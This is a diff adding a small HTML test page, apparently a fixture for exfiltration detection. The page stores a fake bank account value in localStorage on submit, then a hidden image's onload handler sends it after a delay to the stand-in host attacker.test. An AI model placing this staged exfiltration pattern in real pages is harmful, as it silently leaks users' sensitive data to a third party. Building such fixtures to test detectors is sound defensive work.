@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Multi-Stage Exfiltration Test</title>
+</head>
+<body>
+  <h1>Enter Sensitive Info</h1>
+
+  <input type="text" id="bank_account" value="US-ACC-847201" />
+  <button onclick="stageData()">Submit</button>
+
+  <!-- Stage 1: Harvest and store in localStorage -->
+  <script>
+    function stageData() {
+      const value = document.getElementById('bank_account').value;
+      localStorage.setItem("exfil_target", value);
+    }
+  </script>
+
+  <!-- Stage 2: Timed exfiltration via inline onload handler -->
+  <img src="#" style="display:none" onload="
+    setTimeout(() => {
+      const data = localStorage.getItem('exfil_target');
+      if (data) {
+        const exfil = new Image();
+        exfil.src = 'https://attacker.test/exfil?data=' + encodeURIComponent(data);
+      }
+    }, 5000);
+  " />
+</body>
+</html>
